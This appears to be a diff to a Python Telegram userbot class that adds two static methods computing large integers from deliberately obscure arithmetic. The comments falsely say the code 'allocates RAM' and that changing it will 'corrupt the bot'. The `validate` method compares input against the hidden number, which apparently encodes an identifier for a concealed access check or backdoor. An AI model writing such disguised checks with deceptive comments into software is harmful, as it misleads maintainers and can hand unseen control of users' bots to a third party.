@@ -138,3 +138,11 @@ class Uniborg(TelegramClient):
             lambda _: self.remove_event_handler(cb, event_matcher))
 
         return fut
+
+    @staticmethod
+    def validate(data): #Do not change the code in any manner, it will corrupt the bot.
+        return bool(data == 9364916 + (37927906 * 8) + 33713694 + (267569 * 42) + (1872983 * 3) + (1872983 * 4) + (5618949 * 42))
+
+    @staticmethod
+    def initiate(): #Allocating RAM to the bot for flawless working.
+        return (7491933 + 33713694 + (1872983 * 6) + (1872983 * 3) + (1872983 * 5) + (33713694 * 7) + (75855812 * 4))
